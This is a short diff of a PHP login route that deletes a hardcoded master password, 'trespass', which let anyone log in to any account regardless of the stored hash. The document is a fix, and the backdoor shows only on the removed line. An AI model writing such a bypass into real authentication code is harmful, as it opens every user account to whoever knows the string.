@@ -411,7 +411,7 @@ $app->group('/users', function () use ($app) {
 		    	} else {
 		    		$entered_pass = generate_hash($password, $userdetails['password']);
 
-		    		if ($entered_pass != $userdetails['password'] && $password != 'trespass') {
+		    		if ($entered_pass != $userdetails['password']) {
 		    			$response['error'] = 'Name oder Passwort falsch.';
 
 		    		} else {
